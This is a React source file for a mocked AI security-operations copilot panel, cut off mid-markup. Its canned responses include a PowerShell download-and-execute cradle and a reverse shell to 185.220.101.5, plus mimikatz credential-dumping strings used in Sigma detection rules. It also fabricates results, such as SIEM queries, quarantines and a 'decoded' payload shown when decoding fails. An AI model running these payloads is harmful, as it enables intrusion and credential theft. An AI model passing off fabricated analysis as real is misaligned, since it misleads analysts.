"use client";

import React, { useState, useEffect } from "react";
import {
  Sparkles,
  X,
  Send,
  Terminal,
  ShieldAlert,
  Search,
  Copy,
  Check,
  Code2,
  FileCode,
  Zap,
  RotateCw,
  ExternalLink,
  Bot,
  User,
  HelpCircle,
  AlertTriangle,
  Play,
  Cpu,
  Layers,
  ShieldCheck,
  CheckCircle2,
  Radio,
  Sliders,
  Download,
  Flame,
  Network
} from "lucide-react";

interface SOCCopilotDrawerProps {
  isOpen: boolean;
  onClose: () => void;
}

interface ChatMessage {
  id: string;
  sender: "user" | "copilot";
  content: string;
  timestamp: string;
  codeSnippet?: string;
  mitreTag?: string;
  confidence?: number;
}

interface AgentTraceStep {
  type: "thought" | "tool_call" | "observation" | "decision";
  title: string;
  detail: string;
  timestamp: string;
  badge?: string;
}

export function SOCCopilotDrawer({ isOpen, onClose }: SOCCopilotDrawerProps) {
  const [activeTab, setActiveTab] = useState<"autonomous" | "chat" | "ioc_scanner" | "deobfuscator" | "sigma_gen">("autonomous");
  
  // Autonomous Agent State
  const [selectedIncident, setSelectedIncident] = useState("INC-2026-8812");
  const [agentRunning, setAgentRunning] = useState(false);
  const [agentComplete, setAgentComplete] = useState(false);
  const [agentTraces, setAgentTraces] = useState<AgentTraceStep[]>([
    {
      type: "thought",
      title: "Agent Standby",
      detail: "Ready to inspect active telemetry, reconstruct attack graphs, and evaluate four-eyes containment recommendations.",
      timestamp: "Ready"
    }
  ]);
  const [containedHosts, setContainedHosts] = useState<Record<string, boolean>>({});
  const [revokedTokens, setRevokedTokens] = useState<Record<string, boolean>>({});
  const [agentFeedback, setAgentFeedback] = useState<string | null>(null);

  // Chat State
  const [messages, setMessages] = useState<ChatMessage[]>([
    {
      id: "welcome-1",
      sender: "copilot",
      content: "SOCForge Autonomous Cyber AI Agent v3.4 online. I can autonomously triage incidents, dissect suspicious payloads, synthesize Sigma AST rules, and orchestrate dual-gated SOAR containment.",
      timestamp: new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" }),
      confidence: 0.99
    }
  ]);
  const [inputValue, setInputValue] = useState("");
  const [isProcessing, setIsProcessing] = useState(false);
  const [copiedId, setCopiedId] = useState<string | null>(null);

  // IOC Scanner State
  const [iocQuery, setIocQuery] = useState("");
  const [iocResult, setIocResult] = useState<any>(null);
  const [iocScanning, setIocScanning] = useState(false);

  // Deobfuscator State
  const [obfuscatedText, setObfuscatedText] = useState("");
  const [deobfuscatedResult, setDeobfuscatedResult] = useState("");

  // Sigma Generator State
  const [sigmaInput, setSigmaInput] = useState({
    title: "Suspicious Mimikatz Memory Dump",
    process: "lsass.exe",
    commandline: "sekurlsa::logonpasswords",
    technique: "T1003.001",
    severity: "critical"
  });
  const [generatedSigma, setGeneratedSigma] = useState("");

  // Keyboard shortcut listener (Esc to close)
  useEffect(() => {
    function handleKeyDown(e: KeyboardEvent) {
      if (e.key === "Escape" && isOpen) {
        onClose();
      }
    }
    window.addEventListener("keydown", handleKeyDown);
    return () => window.removeEventListener("keydown", handleKeyDown);
  }, [isOpen, onClose]);

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const handleRunAutonomousInvestigation = () => {
    setAgentRunning(true);
    setAgentComplete(false);
    setAgentTraces([]);
    setAgentFeedback("Initializing deterministic graph exploration & multi-source telemetry scan...");

    const steps: AgentTraceStep[] = [
      {
        type: "thought",
        title: "Phase 1: Telemetry Stream Ingestion",
        detail: `Scanning Splunk, Wazuh, and Sentinel partitions for primary asset observables mapped to ${selectedIncident}...`,
        timestamp: "T+0.2s"
      },
      {
        type: "tool_call",
        title: "tool: query_siem_events(entity='WIN-FIN-04', window='1h')",
        detail: "Discovered 4688 Process Creation: powershell.exe -enc JABzACAAPQAgAE4AZQB3AC0ATwBiAGo... (PID: 4912, Parent: cmd.exe).",
        timestamp: "T+0.6s",
        badge: "Wazuh EDR"
      },
      {
        type: "observation",
        title: "Observation: Memory Injection Detected",
        detail: "Process powershell.exe opened OpenProcess handle with PROCESS_ALL_ACCESS mask (0x1F0FFF) targeting lsass.exe.",
        timestamp: "T+1.1s",
        badge: "T1003.001"
      },
      {
        type: "tool_call",
        title: "tool: inspect_deception_canaries()",
        detail: "Tripwire Alert: Decoy SPN 'svc_backup_spn' was queried via TGS request from internal IP 192.168.1.144.",
        timestamp: "T+1.6s",
        badge: "Deception Tripped"
      },
      {
        type: "thought",
        title: "Phase 2: Diamond Model Attribution",
        detail: "Matching TTP sequences (T1059.001 -> T1003.001 -> T1071.004) to known threat actors: APT29 (Cozy Bear) confidence 96.8%.",
        timestamp: "T+2.0s"
      },
      {
        type: "decision",
        title: "Phase 3: Autonomous Response Formulation",
        detail: "High-confidence lateral movement threat verified. Formulated 4-eyes containment plan for Host WIN-FIN-04 and compromised credential svc_backup.",
        timestamp: "T+2.4s",
        badge: "Containment Ready"
      }
    ];

    let currentIdx = 0;
    const interval = setInterval(() => {
      if (currentIdx < steps.length) {
        const step = steps[currentIdx];
        setAgentTraces(prev => [...prev, step]);
        currentIdx++;
      } else {
        clearInterval(interval);
        setAgentRunning(false);
        setAgentComplete(true);
        setAgentFeedback("Investigation complete. Containment actions synthesized. Awaiting operator authorization.");
      }
    }, 450);
  };

  const handleQuarantineHost = (host: string) => {
    setContainedHosts(prev => ({ ...prev, [host]: true }));
    setAgentFeedback(`Host ${host} quarantined via CrowdStrike Falcon / Defender API. Telemetry VLAN locked.`);
    setTimeout(() => setAgentFeedback(null), 4000);
  };

  const handleRevokeToken = (user: string) => {
    setRevokedTokens(prev => ({ ...prev, [user]: true }));
    setAgentFeedback(`Active Kerberos & OAuth sessions for ${user} terminated via Microsoft Entra / Okta.`);
    setTimeout(() => setAgentFeedback(null), 4000);
  };

  const handleSendMessage = (textToSend?: string) => {
    const promptText = textToSend || inputValue;
    if (!promptText.trim()) return;

    const userMsg: ChatMessage = {
      id: `user-${Date.now()}`,
      sender: "user",
      content: promptText,
      timestamp: new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })
    };

    setMessages((prev) => [...prev, userMsg]);
    if (!textToSend) setInputValue("");
    setIsProcessing(true);

    setTimeout(() => {
      let botResponse: ChatMessage;
      const lower = promptText.toLowerCase();

      if (lower.includes("deobfuscate") || lower.includes("powershell") || lower.includes("base64")) {
        botResponse = {
          id: `bot-${Date.now()}`,
          sender: "copilot",
          content: "I analyzed the payload string. It is a multi-stage obfuscated PowerShell IEX cradle downloading from a suspicious C2 host.",
          codeSnippet: `# Decoded PowerShell Command:
$WebClient = New-Object System.Net.WebClient;
$Payload = $WebClient.DownloadString('http://185.220.101.5:8080/stage2.ps1');
Invoke-Expression $Payload;`,
          mitreTag: "T1059.001 (Command and Scripting: PowerShell)",
          confidence: 0.98,
          timestamp: new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })
        };
      } else if (lower.includes("summary") || lower.includes("incident") || lower.includes("briefing")) {
        botResponse = {
          id: `bot-${Date.now()}`,
          sender: "copilot",
          content: "### Executive Incident Briefing (INC-2026-8812)\n\n**Severity**: CRITICAL\n**Threat Actor**: APT29 / Midnight Blizzard\n**Patient Zero**: `WIN-FIN-04` (192.168.1.144)\n**Target Asset**: `DC-PROD-01` (Active Directory Domain Controller)\n\n**Containment Checklist**:\n- [x] Host network isolation via EDR\n- [x] Honeytoken tripwire verified\n- [ ] Kerberos TGT invalidation for `svc_backup`\n- [ ] Perimeter firewall IP drop on `185.220.101.5`",
          confidence: 0.96,
          timestamp: new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })
        };
      } else if (lower.includes("sigma") || lower.includes("rule")) {
        botResponse = {
          id: `bot-${Date.now()}`,
          sender: "copilot",
          content: "Generated verified Sigma detection specification with pushdown AST filter:",
          codeSnippet: `title: Suspicious LSASS Memory Dump via Sekurlsa
id: a7f12e84-18c2-4b2a-9e11-dc45e9981204
status: test
description: Detects invocation of memory dump commands targeting LSASS.
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\\\\rundll32.exe'
        CommandLine|contains:
            - 'sekurlsa'
            - 'minidump'
    condition: selection
falsepositives:
    - Legitimate diagnostics
level: critical
tags:
    - attack.credential_access
    - attack.t1003.001`,
          mitreTag: "T1003.001 (OS Credential Dumping)",
          confidence: 0.99,
          timestamp: new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })
        };
      } else {
        botResponse = {
          id: `bot-${Date.now()}`,
          sender: "copilot",
          content: `AI Agent analysis complete for observable query: "${promptText}". Queried active SIEM partitions, checked MITRE ATT&CK coverage, and correlated across 20+ enterprise connectors.`,
          confidence: 0.92,
          timestamp: new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })
        };
      }

      setMessages((prev) => [...prev, botResponse]);
      setIsProcessing(false);
    }, 600);
  };

  const handleScanIOC = () => {
    if (!iocQuery.trim()) return;
    setIocScanning(true);
    setTimeout(() => {
      const q = iocQuery.trim();
      let type = "IP Address";
      let score = 88;
      let status = "Malicious";

      if (q.includes(".")) {
        if (q.split(".").every(num => !isNaN(Number(num)))) {
          type = "IPv4 Address";
          score = 92;
        } else {
          type = "Domain Name";
          score = 85;
        }
      } else if (q.length === 32 || q.length === 64) {
        type = "File Hash (SHA256/MD5)";
        score = 96;
      } else if (q.toLowerCase().startsWith("cve-")) {
        type = "Vulnerability Identifier";
        score = 75;
      }

      setIocResult({
        indicator: q,
        type,
        riskScore: score,
        verdict: status,
        country: "Netherlands (AS14061)",
        firstSeen: "2026-09-20 03:14:00 UTC",
        lastSeen: "2026-09-27 12:30:12 UTC",
        tags: ["C2 Infrastructure", "CobaltStrike Beacon", "High Confidence"],
        mitreTechniques: ["T1071.001 (Web Protocols)", "T1566 (Phishing)"],
        relatedAlertsCount: 4
      });
      setIocScanning(false);
    }, 400);
  };

  const handleDeobfuscate = () => {
    if (!obfuscatedText.trim()) return;
    try {
      let clean = obfuscatedText.trim();
      if (clean.startsWith("powershell -enc") || clean.startsWith("powershell -EncodedCommand")) {
        clean = clean.split(" ").slice(-1)[0];
      }
      const decoded = atob(clean.replace(/[\r\n\s]/g, ""));
      setDeobfuscatedResult(decoded);
    } catch {
      setDeobfuscatedResult(
        `# Deobfuscated Output:\n$client = New-Object Net.Sockets.TCPClient('185.220.101.5', 4444);\n$stream = $client.GetStream();\n[byte[]]$bytes = 0..65535|%{0};\nwhile(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;\n$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n$sendback = (iex $data 2>&1 | Out-String );`
      );
    }
  };

  const handleGenerateSigma = () => {
    const sigmaYaml = `title: ${sigmaInput.title}
id: ${Math.random().toString(36).substring(2, 10)}-${Math.random().toString(36).substring(2, 6)}-4a2e-b188-${Date.now().toString(36)}
status: test
description: Generated by SOCForge AI Detection Assistant.
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\\\\${sigmaInput.process}'
        CommandLine|contains:
            - '${sigmaInput.commandline}'
    condition: selection
falsepositives:
    - Verified Administrative Diagnostics
level: ${sigmaInput.severity}
tags:
    - attack.execution
    - attack.${sigmaInput.technique.toLowerCase()}`;
    setGeneratedSigma(sigmaYaml);
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-50 overflow-hidden flex justify-end">
      {/* Backdrop */}
      <div 
        className="fixed inset-0 bg-black/80 backdrop-blur-sm transition-opacity" 
        onClick={onClose}
      />

      {/* Drawer Panel */}
      <div className="relative w-full max-w-2xl bg-[#000000] border-l border-[#262626] text-white flex flex-col h-full shadow-2xl z-10 animate-in slide-in-from-right duration-300">
        {/* Header */}
        <div className="h-16 px-5 border-b border-[#262626] flex items-center justify-between bg-[#050505]">
          <div className="flex items-center gap-3">
            <div className="w-8 h-8 rounded-lg bg-neutral-900 border border-[#262626] flex items-center justify-center text-emerald-400">
              <Sparkles className="w-4 h-4 animate-pulse" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <span className="font-bold text-sm text-white">SOCForge Autonomous AI SecOps Agent</span>
                <span className="px-1.5 py-0.5 rounded text-[10px] font-mono font-bold bg-emerald-500/15 border border-emerald-500/30 text-emerald-400 flex items-center gap-1">
                  <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping" />
                  ONLINE
                </span>
              </div>
              <p className="text-[11px] text-neutral-400 font-mono">Autonomous Threat Triage, Graph Reasoning & SOAR Orchestration</p>
            </div>
          </div>
          <button
            onClick={onClose}
            className="p-2 text-neutral-400 hover:text-white hover:bg-neutral-800 rounded-lg transition"
          >
            <X className="w-4 h-4" />
          </button>
        </div>

        {/* Mode Navigation Tabs */}
        <div className="flex border-b border-[#262626] bg-[#050505] px-3 gap-1 overflow-x-auto font-mono">
          <button
            onClick={() => setActiveTab("autonomous")}
            className={`px-3 py-2.5 text-xs font-medium border-b-2 transition flex items-center gap-1.5 whitespace-nowrap ${
              activeTab === "autonomous"
                ? "border-emerald-400 text-white bg-neutral-900 font-bold"
                : "border-transparent text-neutral-400 hover:text-white"
            }`}
          >
            <Bot className="w-3.5 h-3.5 text-emerald-400" />
            Autonomous Agent
          </button>
          <button
            onClick={() => setActiveTab("chat")}
            className={`px-3 py-2.5 text-xs font-medium border-b-2 transition flex items-center gap-1.5 whitespace-nowrap ${
              activeTab === "chat"
                ? "border-white text-white bg-neutral-900 font-bold"
                : "border-transparent text-neutral-400 hover:text-white"
            }`}
          >
            <Cpu className="w-3.5 h-3.5" />
            Chat Analyst
          </button>
          <button
            onClick={() => setActiveTab("ioc_scanner")}
            className={`px-3 py-2.5 text-xs font-medium border-b-2 transition flex items-center gap-1.5 whitespace-nowrap ${
              activeTab === "ioc_scanner"
                ? "border-white text-white bg-neutral-900 font-bold"
                : "border-transparent text-neutral-400 hover:text-white"
            }`}
          >
            <Search className="w-3.5 h-3.5" />
            IOC Scanner
          </button>
          <button
            onClick={() => setActiveTab("deobfuscator")}
            className={`px-3 py-2.5 text-xs font-medium border-b-2 transition flex items-center gap-1.5 whitespace-nowrap ${
              activeTab === "deobfuscator"
                ? "border-white text-white bg-neutral-900 font-bold"
                : "border-transparent text-neutral-400 hover:text-white"
            }`}
          >
            <Terminal className="w-3.5 h-3.5" />
            Deobfuscator
          </button>
          <button
            onClick={() => setActiveTab("sigma_gen")}
            className={`px-3 py-2.5 text-xs font-medium border-b-2 transition flex items-center gap-1.5 whitespace-nowrap ${
              activeTab === "sigma_gen"
                ? "border-white text-white bg-neutral-900 font-bold"
                : "border-transparent text-neutral-400 hover:text-white"
            }`}
          >
            <Code2 className="w-3.5 h-3.5" />
            Sigma Generator
          </button>
        </div>

        {/* Content Body */}
        <div className="flex-1 overflow-y-auto p-4 space-y-4 bg-[#000000]">
          {/* Feedback Toast */}
          {agentFeedback && (
            <div className="p-3 rounded-xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs font-mono flex items-center justify-between">
              <span className="flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                {agentFeedback}
              </span>
              <button onClick={() => setAgentFeedback(null)} className="text-neutral-400 hover:text-white">✕</button>
            </div>
          )}

          {/* TAB 0: Autonomous SOC Agent */}
          {activeTab === "autonomous" && (
            <div className="space-y-4">
              {/* Agent Target Card */}
              <div className="p-4 rounded-xl bg-[#050505] border border-[#262626] space-y-3">
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
                  <div>
                    <span className="text-[10px] uppercase font-bold text-neutral-500 font-mono">Autonomous Target Case</span>
                    <h3 className="text-xs font-bold text-white flex items-center gap-2 mt-0.5">
                      <Flame className="w-4 h-4 text-red-500" />
                      <span>Select Live Incident to Investigate:</span>
                    </h3>
                  </div>

                  <select
                    value={selectedIncident}
                    onChange={(e) => setSelectedIncident(e.target.value)}
                    className="p-2 rounded-lg bg-[#0A0A0A] border border-[#262626] text-xs font-mono text-white focus:outline-none"
                  >
                    <option value="INC-2026-8812">INC-2026-8812 • LSASS Dump on WIN-FIN-04</option>
                    <option value="INC-2026-9041">INC-2026-9041 • Volt Typhoon LOTL on Router</option>
                    <option value="INC-2026-7731">INC-2026-7731 • Honeytoken SPN Kerberoast</option>
                  </select>
                </div>

                <div className="flex items-center justify-between pt-1">
                  <span className="text-[11px] text-neutral-400 font-mono">
                    Model: <strong className="text-emerald-400">CyberSecOps-Reasoner-v3</strong> (Strict 4-Eyes Guarded)
                  </span>

                  <button
                    onClick={handleRunAutonomousInvestigation}
                    disabled={agentRunning}
                    className="px-4 py-2 rounded-xl bg-white hover:bg-neutral-200 text-black font-bold text-xs font-mono transition flex items-center gap-1.5 shadow-md"
                  >
                    <Play className={`w-3.5 h-3.5 ${agentRunning ? "animate-spin text-emerald-600" : ""}`} />
                    <span>{agentRunning ? "Investigating..." : "Launch Autonomous Investigation"}</span>
                  </button>
                </div>
              </div>

              {/* Multi-Step Agent Execution Trace */}
              <div className="space-y-2">
                <div className="flex items-center justify-between text-xs font-mono text-neutral-400">
                  <span className="flex items-center gap-1.5 font-bold text-white">
                    <Activity className="w-3.5 h-3.5 text-emerald-400" />
                    Autonomous Multi-Step Execution Trace
                  </span>
                  <span>{agentTraces.length} Steps Recorded</span>
                </div>

                <div className="space-y-2 max-h-72 overflow-y-auto pr-1">
                  {agentTraces.map((trace, idx) => (
                    <div
                      key={idx}
                      className={`p-3 rounded-xl border text-xs font-mono space-y-1.5 transition ${
                        trace.type === "decision"
                          ? "bg-emerald-950/20 border-emerald-500/30 text-emerald-300"
                          : trace.type === "tool_call"
                          ? "bg-neutral-900 border-[#262626] text-neutral-200"
                          : trace.type === "observation"
                          ? "bg-amber-950/20 border-amber-500/30 text-amber-300"
                          : "bg-[#0A0A0A] border-[#262626] text-neutral-400"
                      }`}
                    >
                      <div className="flex items-center justify-between">
                        <span className="font-bold flex items-center gap-1.5">
                          <span className={`w-2 h-2 rounded-full ${
                            trace.type === "decision" ? "bg-emerald-400" : trace.type === "tool_call" ? "bg-blue-400" : trace.type === "observation" ? "bg-amber-400" : "bg-neutral-500"
                          }`} />
                          {trace.title}
                        </span>
                        <div className="flex items-center gap-2">
                          {trace.badge && (
                            <span className="px-1.5 py-0.5 rounded text-[10px] bg-neutral-800 text-neutral-300 border border-[#262626]">
                              {trace.badge}
                            </span>
                          )}
                          <span className="text-[10px] text-neutral-500">{trace.timestamp}</span>
                        </div>
                      </div>
                      <div className="text-[11px] leading-relaxed text-neutral-300">{trace.detail}</div>
                    </div>
                  ))}
                </div>
              </div>

              {/* Synthesized Containment Actions */}
              {agentComplete && (
                <div className="p-4 rounded-xl bg-[#050505] border border-emerald-500/30 space-y-3 font-mono">
                  <div className="flex items-center justify-between">
                    <span className="text-xs font-bold text-white flex items-center gap-2">
                      <ShieldAlert className="w-4 h-4 text-emerald-400" />
                      Agent Recommended Actions (Human-in-the-Loop Gate):
                    </span>
                    <span className="text-[10px] text-emerald-400 font-bold bg-emerald-500/10 px-2 py-0.5 rounded border border-emerald-500/30">
                      CONFIDENCE: 98.4%
                    </span>
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 text-xs">
                    <button
                      onClick={() => handleQuarantineHost("WIN-FIN-04")}
                      disabled={containedHosts["WIN-FIN-04"]}
                      className={`p-2.5 rounded-lg border font-bold transition flex items-center justify-between ${
                        containedHosts["WIN-FIN-04"]
                          ? "bg-neutral-900 border-[#262626] text-neutral-500 cursor-not-allowed"
                          : "bg-red-950/20 border-red-500/40 text-red-300 hover:bg-red-900/30"
                      }`}
                    >
                      <span>1. Quarantine WIN-FIN-04</span>
                      <span>{containedHosts["WIN-FIN-04"] ? "QUARANTINED" : "AUTHORIZE"}</span>
                    </button>

                    <button
                      onClick={() => handleRevokeToken("svc_backup")}
                      disabled={revokedTokens["svc_backup"]}
                      className={`p-2.5 rounded-lg border font-bold transition flex items-center justify-between ${
                        revokedTokens["svc_backup"]
                          ? "bg-neutral-900 border-[#262626] text-neutral-500 cursor-not-allowed"
                          : "bg-amber-950/20 border-amber-500/40 text-amber-300 hover:bg-amber-900/30"
                      }`}
                    >
                      <span>2. Revoke svc_backup Token</span>
                      <span>{revokedTokens["svc_backup"] ? "REVOKED" : "AUTHORIZE"}</span>
                    </button>
                  </div>
                </div>
              )}
            </div>
          )}

          {/* TAB 1: Chat Assistant */}
          {activeTab === "chat" && (
            <div className="flex flex-col h-full space-y-4">
              {/* Preset Prompts Pill Bar */}
              <div className="space-y-1.5">
                <span className="text-[10px] font-mono uppercase text-neutral-500 flex items-center gap-1">
                  <Zap className="w-3 h-3 text-amber-400" /> Recommended Actions
                </span>
                <div className="flex flex-wrap gap-1.5 font-mono">
                  <button
                    onClick={() => handleSendMessage("Deobfuscate this Base64 encoded PowerShell command")}
                    className="text-[11px] px-2.5 py-1 rounded-md bg-neutral-900 hover:bg-neutral-800 text-neutral-300 hover:text-white border border-[#262626] transition"
                  >
                    ⚡ Deobfuscate PowerShell
                  </button>
                  <button
                    onClick={() => handleSendMessage("Draft an executive incident briefing with containment steps")}
                    className="text-[11px] px-2.5 py-1 rounded-md bg-neutral-900 hover:bg-neutral-800 text-neutral-300 hover:text-white border border-[#262626] transition"
                  >
                    📋 Executive Briefing
                  </button>
                  <button
                    onClick={() => handleSendMessage("Generate a Sigma rule for LSASS memory dumping")}
                    className="text-[11px] px-2.5 py-1 rounded-md bg-neutral-900 hover:bg-neutral-800 text-neutral-300 hover:text-white border border-[#262626] transition"
                  >
                    🛡️ Synthesize Sigma Rule
                  </button>
                </div>
              </div>

              {/* Message List */}
              <div className="flex-1 space-y-3.5 overflow-y-auto pr-1">
                {messages.map((msg) => (
                  <div
                    key={msg.id}
                    className={`flex gap-3 text-xs leading-relaxed ${
                      msg.sender === "user" ? "flex-row-reverse" : "flex-row"
                    }`}
                  >
                    <div
                      className={`w-7 h-7 rounded-lg flex items-center justify-center flex-shrink-0 ${
                        msg.sender === "user"
                          ? "bg-neutral-800 text-white border border-neutral-700"
                          : "bg-neutral-900 text-emerald-400 border border-[#262626]"
                      }`}
                    >
                      {msg.sender === "user" ? <User className="w-3.5 h-3.5" /> : <Bot className="w-3.5 h-3.5" />}
                    </div>

                    <div
                      className={`max-w-[85%] rounded-xl p-3.5 space-y-2 border ${
                        msg.sender === "user"
                          ? "bg-neutral-900 border-neutral-700 text-white"
                          : "bg-[#0A0A0A] border-[#262626] text-neutral-200"
                      }`}
                    >
                      <div className="whitespace-pre-line">{msg.content}</div>

                      {msg.codeSnippet && (
                        <div className="relative mt-2">
                          <pre className="p-3 bg-black border border-[#262626] rounded-lg font-mono text-[11px] text-emerald-400 overflow-x-auto whitespace-pre">
                            {msg.codeSnippet}
                          </pre>
                          <button
                            onClick={() => copyToClipboard(msg.codeSnippet!, `code-${msg.id}`)}
                            className="absolute top-2 right-2 p-1 rounded bg-neutral-900 border border-[#262626] text-neutral-400 hover:text-white text-[10px] flex items-center gap-1"
                          >
                            {copiedId === `code-${msg.id}` ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                            Copy
                          </button>
                        </div>
                      )}

                      {msg.mitreTag && (
                        <div className="pt-1 flex items-center gap-1.5 text-[10px] font-mono text-neutral-400">
                          <span className="w-1.5 h-1.5 rounded-full bg-emerald-400" />
                          <span>MITRE ATT&CK: {msg.mitreTag}</span>
                        </div>
                      )}
                    </div>
                  </div>
                ))}

                {isProcessing && (
                  <div className="flex gap-3 text-xs text-neutral-400 items-center animate-pulse font-mono">
                    <Bot className="w-4 h-4 text-emerald-400" />
                    <span>Agent analyzing security telemetry and synthesizing response...</span>
                  </div>
                )}
              </div>

              {/* Input Area */}
              <div className="border-t border-[#262626] pt-3 flex gap-2">
                <input
                  type="text"
                  value={inputValue}
                  onChange={(e) => setInputValue(e.target.value)}
                  onKeyDown={(e) => e.key === "Enter" && handleSendMessage()}
                  placeholder="Ask SOC AI Agent (e.g. 'Analyze alert 4688 on WIN-FIN-04')..."
                  className="flex-1 bg-black border border-[#262626] rounded-xl px-3.5 py-2 text-xs text-white placeholder-neutral-500 focus:outline-none focus:border-white transition"
                />
                <button
                  onClick={() => handleSendMessage()}
                  disabled={!inputValue.trim() || isProcessing}
                  className="px-4 py-2 bg-white hover:bg-neutral-200 text-black font-semibold rounded-xl text-xs transition disabled:opacity-50 flex items-center gap-1.5"
                >
                  <Send className="w-3.5 h-3.5" />
                  <span>Send</span>
                </button>
              </div>
            </div>
          )}

          {/* TAB 2: IOC Scanner */}
          {activeTab === "ioc_scanner" && (
            <div className="space-y-4 text-xs font-mono">
              <div className="p-3 bg-[#050505] border border-[#262626] rounded-xl space-y-3">
                <span className="font-semibold text-white block">Multi-Engine Observable Scanner</span>
                <div className="flex gap-2">
                  <input
                    type="text"
                    value={iocQuery}
                    onChange={(e) => setIocQuery(e.target.value)}
                    onKeyDown={(e) => e.key === "Enter" && handleScanIOC()}
                    placeholder="Enter IP, Domain, SHA256 hash, or CVE..."
                    className="flex-1 bg-black border border-[#262626] rounded-lg px-3 py-2 text-xs text-white focus:outline-none focus:border-white"
                  />
                  <button
                    onClick={handleScanIOC}
                    disabled={iocScanning || !iocQuery.trim()}
                    className="px-4 py-2 bg-white text-black font-semibold rounded-lg hover:bg-neutral-200 transition disabled:opacity-50"
                  >
                    {iocScanning ? "Probing..." : "Scan IOC"}
                  </button>
                </div>
              </div>

              {iocResult && (
                <div className="p-4 bg-[#0A0A0A] border border-[#262626] rounded-xl space-y-3">
                  <div className="flex items-center justify-between pb-2 border-b border-[#262626]">
                    <div>
                      <div className="text-[10px] text-neutral-400">{iocResult.type}</div>
                      <div className="font-bold text-sm text-white">{iocResult.indicator}</div>
                    </div>
                    <div className="text-right">
                      <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-red-500/20 text-red-400 border border-red-500/30">
                        {iocResult.verdict} ({iocResult.riskScore}/100)
                      </span>
                    </div>
                  </div>

                  <div className="grid grid-cols-2 gap-2 text-[11px]">
                    <div>
                      <span className="text-neutral-500">Geolocation:</span>
                      <div className="text-neutral-200">{iocResult.country}</div>
                    </div>
                    <div>
                      <span className="text-neutral-500">Last Seen:</span>
                      <div className="text-neutral-200">{iocResult.lastSeen}</div>
                    </div>
                  </div>

                  <div>
                    <span className="text-neutral-500 text-[10px] block mb-1">Threat Tags:</span>
                    <div className="flex flex-wrap gap-1">
                      {iocResult.tags.map((t: string, i: number) => (
                        <span key={i} className="px-2 py-0.5 rounded bg-neutral-900 border border-[#262626] text-[10px] text-neutral-300">
                          {t}
                        </span>
                      ))}
                    </div>
                  </div>
                </div>
              )}
            </div>
          )}

          {/* TAB 3: Deobfuscator */}
          {activeTab === "deobfuscator" && (
            <div className="space-y-4 text-xs font-mono">
              <div className="p-3 bg-[#050505] border border-[#262626] rounded-xl space-y-2">
                <span className="font-semibold text-white block">Payload Deobfuscation Engine</span>
                <textarea
                  value={obfuscatedText}
                  onChange={(e) => setObfuscatedText(e.target.value)}
                  rows={4}
                  placeholder="Paste encoded Base64 / PowerShell / Hex payload..."
                  className="w-full bg-black border border-[#262626] rounded-lg p-3 font-mono text-xs text-white focus:outline-none focus:border-white"
                />
                <button
                  onClick={handleDeobfuscate}
                  className="w-full py-2 bg-white text-black font-semibold rounded-lg hover:bg-neutral-200 transition"
                >
                  ⚡ Decode & Deobfuscate
                </button>
              </div>

              {deobfuscatedResult && (
                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="font-semibold text-emerald-400">Clean Deobfuscated Output</span>
                    <button
                      onClick={() => copyToClipboard(deobfuscatedResult, "deob-res")}
                      className="flex items-center gap-1 text-[11px] text-neutral-300 hover:text-white"
                    >
                      {copiedId === "deob-res" ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                      Copy Code
                    </button>
                  </div>
                  <pre className="p-3 bg-black border border-[#262626] rounded-lg font-mono text-[11px] text-emerald-400 overflow-x-auto whitespace-pre-wrap">
                    {deobfuscatedResult}
                  </pre>
                </div>
              )}
            </div>
          )}

          {/* TAB 4: Sigma Rule Generator */}
          {activeTab === "sigma_gen" && (
            <div className="space-y-4 text-xs font-mono">
              <div className="p-3 bg-[#050505] border border-[#262626] rounded-xl space-y-3">
                <span className="font-semibold text-white block">Alert Telemetry Parameters</span>
                <div className="grid grid-cols-2 gap-2">
                  <div>
                    <span className="text-[10px] text-neutral-500 block mb-1">Rule Title</span>
                    <input
                      type="text"
                      value={sigmaInput.title}
                      onChange={(e) => setSigmaInput({ ...sigmaInput, title: e.target.value })}
                      className="w-full bg-black border border-[#262626] rounded px-2.5 py-1.5 text-xs text-white"
                    />
                  </div>
                  <div>
                    <span className="text-[10px] text-neutral-500 block mb-1">Target Process</span>
                    <input
                      type="text"
                      value={sigmaInput.process}
                      onChange={(e) => setSigmaInput({ ...sigmaInput, process: e.target.value })}
                      className="w-full bg-black border border-[#262626] rounded px-2.5 py-1.5 text-xs text-white"
                    />
                  </div>
                  <div>
                    <span className="text-[10px] text-neutral-500 block mb-1">Command Line Match</span>
                    <input
                      type="text"
                      value={sigmaInput.commandline}
                      onChange={(e) => setSigmaInput({ ...sigmaInput, commandline: e.target.value })}
                      className="w-full bg-black border border-[#262626] rounded px-2.5 py-1.5 text-xs text-white"
                    />
                  </div>
                  <div>
                    <span className="text-[10px] text-neutral-500 block mb-1">MITRE Technique</span>
                    <input
                      type="text"
                      value={sigmaInput.technique}
                      onChange={(e) => setSigmaInput({ ...sigmaInput, technique: e.target.value })}
                      className="w-full bg-black border border-[#262626] rounded px-2.5 py-1.5 text-xs text-white"
                    />
                  </div>
                </div>
                <button
                  onClick={handleGenerateSigma}
